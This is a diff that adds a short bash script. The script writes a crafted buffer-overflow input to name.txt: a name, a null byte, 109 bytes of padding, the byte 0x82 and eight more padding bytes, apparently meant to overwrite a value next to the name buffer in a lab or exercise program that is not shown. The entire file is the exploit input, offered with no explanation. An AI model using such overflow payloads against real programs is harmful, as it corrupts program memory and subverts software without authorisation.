@@ -1,0 +1,4 @@
+#!/bin/bash
+
+python -c 'print "Wright Kim" + "\0" + "\x41"*109+ "\x82"+"\x41"*8' >> name.txt
+
